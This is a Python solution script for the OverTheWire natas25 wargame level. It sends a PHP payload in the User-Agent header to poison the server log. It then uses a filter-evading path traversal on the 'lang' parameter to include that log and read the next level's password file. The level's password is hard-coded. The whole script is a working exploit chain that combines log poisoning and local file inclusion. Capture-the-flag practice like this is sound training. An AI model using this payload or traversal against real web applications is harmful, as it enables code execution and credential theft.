#!/usr/bin/env python3
import requests

url = "http://natas25.natas.labs.overthewire.org/"

def trav(a: int):
    return "..././" * a

payload = "<?php echo file_get_contents('/etc/natas_webpass/natas26') ?>"

with requests.Session() as s:
    s.auth = (u'natas25', 'GHF6X7YwACaYYssHVY05cFq83hRktl4c')
    s.headers.update({"User-Agent": f"{payload}"})

    req = s.get(f"{url}/index.php") # params = {"lang": "natas_webapps"})
    sess_id = s.cookies.get("PHPSESSID")

    print(req.text)

    print("=" * 20)

    req = s.get(f"{url}/index.php", params = {"lang":f"{trav(6)}var/www/natas/natas25/logs/natas25_{sess_id}.log"})
    sess_id = s.cookies.get("PHPSESSID")
    print(req.text)
